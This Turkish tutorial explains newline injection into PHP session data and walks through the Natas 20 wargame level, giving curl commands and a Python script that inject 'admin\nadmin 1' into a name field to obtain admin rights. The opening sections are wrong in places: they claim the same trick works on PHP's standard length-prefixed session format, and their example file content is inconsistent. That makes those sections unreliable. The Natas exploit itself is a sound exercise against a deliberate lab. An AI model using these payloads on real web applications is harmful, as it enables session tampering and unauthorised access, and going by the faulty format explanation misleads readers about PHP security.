# 🌐 Web Güvenliği — Session Manipulation & Newline Injection

> PHP session dosyaları satır satır `key value` formatında saklanır.
> Eğer `\n` karakterini bir değere sokabilirsen, sahte satır ekleyebilirsin.

---

## 📋 İçindekiler

- [PHP Session Dosya Formatı](#php-session-dosya-formatı)
- [Newline Injection Nedir?](#newline-injection-nedir)
- [Session Dosyasına Sahte Veri Ekleme](#session-dosyasına-sahte-veri-ekleme)
- [Natas'ta Kullanım](#natasta-kullanım)

---

## PHP Session Dosya Formatı

PHP, session verilerini `/tmp/sess_[PHPSESSID]` dosyalarında saklar. Format:

```
key|s:uzunluk:"değer";key2|i:sayı;
```

Örnek:

```
username|s:5:"admin";admin|i:0;
```

- `username|s:5:"admin";` → username = "admin" (5 karakter string)
- `admin|i:0;` → admin = 0 (integer)

Eğer `admin|i:1;` yazılabilirse → admin yetkisi kazanılır.

---

## Newline Injection Nedir?

Uygulama kullanıcı girdisini session dosyasına yazıyorsa ve `\n` (newline, yeni satır) karakterini filtrelemiyorsa, saldırgan session dosyasına yeni satır ekleyebilir.

```
Normal girdi: "admin"
Session dosyası: username|s:5:"admin";admin|i:0;

Kötü amaçlı girdi: "admin\nadmin|i:1"
Session dosyası:
  username|s:..:"admin"
  admin|i:1;admin|i:0;   ← sahte admin=1 satırı eklendi!
```

---

## Session Dosyasına Sahte Veri Ekleme

### Adım Adım

```python
import requests

# \n URL encoded: %0a
# Session dosyasına admin|i:1; satırını ekle
payload = "admin\nadmin|i:1"

# Bu payload session'a yazılır:
# username = "admin\nadmin|i:1"
# Dosyada: username|s:..:"admin\nadmin|i:1";
# PHP parse ederken \n yeni satır olarak alır
# → admin|i:1 ayrı bir key olur
```

### PHP Session Parse Mantığı

PHP session dosyasını parse ederken `|` ile key/value ayırır, `;` ile değer sonunu belirler. `\n` dosyada gerçek satır sonu olduğunda PHP bunu görmezden gelmez — her satırı ayrı entry olarak okur.

---

## Natas'ta Kullanım

### Natas 20 — Newline Injection ile Admin

**Kaynak kod (özet):**

```php
function print_credentials() {
    if($_SESSION and array_key_exists("admin", $_SESSION)
       and $_SESSION["admin"] == 1) {
        print "You are an admin. Password: <censored>";
    } else {
        print "You are logged in as a regular user.";
    }
}

function myread($sid) {
    // Session dosyasını oku
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    $data = file_get_contents($filename);
    foreach(explode("\n", $data) as $line) {
        $parts = explode(" ", $line, 2);
        if($parts[0] != "")
            $_SESSION[$parts[0]] = $parts[1];
    }
}

function mywrite($sid, $data) {
    // Session dosyasına yaz
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    $data = "";
    foreach($_SESSION as $key => $value) {
        $data .= "$key $value\n";   // ← key value\n formatında yaz
    }
    file_put_contents($filename, $data);
}
```

**Format:** `key value\n` — PHP'nin standart formatından farklı, custom format.

**Analiz:**

Session dosyası şöyle görünür:
```
name admin
```

Eğer name olarak `admin\nadmin 1` yazarsak:
```
name admin
admin 1        ← myread bunu ayrı satır olarak okur → $_SESSION['admin'] = 1
```

**Exploit:**

```bash
# Adım 1: İsmi newline + admin 1 ile gönder
curl -u natas20:[şifre] \
     -b "PHPSESSID=benim_session_id" \
     --data "name=admin%0aadmin+1&debug=1" \
     "http://natas20.natas.labs.overthewire.org/"

# Adım 2: Aynı session ile tekrar istek at (session dosyası yazıldı, şimdi okuyacak)
curl -u natas20:[şifre] \
     -b "PHPSESSID=benim_session_id" \
     "http://natas20.natas.labs.overthewire.org/"
```

**Python ile (iki adım):**

```python
import requests

url      = "http://natas20.natas.labs.overthewire.org/"
username = "natas20"
password = "[natas20_şifresi]"
session  = {"PHPSESSID": "hacked_session_123"}

# Adım 1: Payload'ı session'a yaz
payload = "admin\nadmin 1"
r1 = requests.post(
    url,
    data={"name": payload, "debug": "1"},
    cookies=session,
    auth=(username, password)
)
print("[*] Session yazıldı")

# Adım 2: Aynı session ile tekrar istek at
r2 = requests.get(
    url,
    cookies=session,
    auth=(username, password)
)

if "Password" in r2.text:
    print("[✓] Admin erişimi sağlandı!")
    print(r2.text)
```

---

### İki İstek Neden Gerekiyor?

```
İstek 1: POST name=admin\nadmin 1
  → mywrite() çalışır → session dosyasına yazar
  → myread() henüz yeni veriyi okumadı

İstek 2: GET
  → myread() çalışır → session dosyasını okur
  → "admin 1" satırını bulur → $_SESSION['admin'] = 1
  → print_credentials() → şifreyi gösterir
```

---

### Newline Injection — Kontrol Listesi

```
Tespit:
  ☐ Uygulama session'a kullanıcı girdisi yazıyor mu?
  ☐ Session dosyası/verisi satır bazlı format mı kullanıyor?
  ☐ \n veya \r\n filtrelenmiş mi?

Exploit:
  ☐ %0a (URL encoded \n) veya %0d%0a (\r\n) ile test et
  ☐ İki istek gerekiyor: önce yaz, sonra oku
  ☐ debug parametresi varsa session içeriğini gösterir
```

---

## 🔗 Kaynaklar

- [OWASP — Session Fixation](https://owasp.org/www-community/attacks/Session_fixation)
- [PHP — Custom Session Handlers](https://www.php.net/manual/en/function.session-set-save-handler.php)

---

**Önceki konu:** [14_session_brute_force.md](./14_session_brute_force.md)
**Sonraki konu:** [16_http_redirect_bypass.md](./16_http_redirect_bypass.md)

*Bu rehber [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) reposunun bir parçasıdır.*
